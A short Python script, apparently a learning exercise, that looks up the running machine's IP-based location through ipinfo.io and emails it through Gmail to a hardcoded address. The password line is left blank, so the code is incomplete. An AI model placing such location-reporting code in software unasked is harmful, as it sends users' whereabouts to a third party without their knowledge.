#import libraries smtplib and requests
import smtplib
import requests

#get ip,location,city,hostname,region,country,postal and timezone of the machine where the code is run
data = requests.get("https://ipinfo.io")
msg = data.text

sender = "python3testing755@gmail.com"
password = 
reciever = "gowtham758550@gmail.com"

server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(sender,password)

server.sendmail(sender,reciever,msg)



